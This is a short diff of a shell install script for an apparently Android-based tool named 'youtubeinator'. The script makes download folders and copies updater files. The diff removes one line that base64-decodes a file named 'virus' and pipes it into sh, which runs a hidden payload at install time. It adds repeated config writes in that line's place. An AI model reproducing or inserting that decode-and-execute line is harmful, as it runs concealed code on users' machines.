@@ -22,7 +22,11 @@ mkdir "/sdcard/download/www.philiphacker.in/youtubeinator/rotate/"
 mkdir "/sdcard/download/www.philiphacker.in/youtubeinator/thumbnail/"
 mkdir "/sdcard/download/www.philiphacker.in/youtubeinator/playlist/"
 mkdir "/sdcard/download/www.philiphacker.in/youtubeinator/channel/"
-base64 -d virus | sed 's/eval/echo/g' | sh > .god
+echo best >>yt.conf
+echo best >>yt.conf
+echo best >>yt.conf
+echo best >>yt.conf
+echo best >>yt.conf
 cp updater /sdcard/download/www.philiphacker.in/youtubeinator/
 cp unins /sdcard/download/www.philiphacker.in/youtubeinator/
 echo 1 > check.io
